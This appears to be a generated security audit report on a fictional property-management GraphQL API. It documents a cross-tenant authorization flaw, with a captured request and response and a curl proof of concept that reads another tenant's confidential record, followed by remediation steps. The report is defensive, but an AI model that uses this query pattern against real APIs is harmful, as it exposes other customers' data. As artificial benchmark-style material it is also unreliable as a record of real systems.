# Security Analysis Report
**System:** EstateFlow Property API
**Domain:** Real Estate / PropTech
**Example ID:** GQL-0317
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 1.10 | Cross-service identity propagation drift on `getResource` — attacker reads property records outside their identity scope |

---

## Finding 1 — BOLA: Cross-Service Identity Propagation Drift (Pattern 1.10)

### Summary
The GraphQL API at `https://api.estateflow-property-.example.com/graphql` allows a caller's identity to drift between services without consistent re-validation. The resolver fetches by `resourceId` without verifying the JWT `tenantId` claim matches the object's `tenantId`, enabling the attacker to read property records belonging to `tenant-e43e`.

**Note:** `x-request-id: req-f4a8e43e` is a server-assigned response header; it does not appear in the outgoing request. The HAR request and response both use `getResource` — no inconsistency in operation name.
**Note on hostname:** `api.estateflow-property-.example.com` (trailing dash) reproduced exactly from context.txt.

**Pattern:** 1.10 — Cross-service identity propagation drift (BOLA)
**Affected endpoint:** `POST https://api.estateflow-property-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.estateflow-property-.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { getResource(id: \"R-2317\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Property Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-e43e",
      "ownerId": "other-user-f4a8e43e",
      "data": {
        "sensitiveField": "CONFIDENTIAL-f4a8e43e",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.estateflow-property-.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getResource(id: \"R-2317\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-e43e, sensitiveField: CONFIDENTIAL-f4a8e43e
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. All downstream service calls must re-validate identity context consistently.
3. Redis cache key must include tenant dimension.
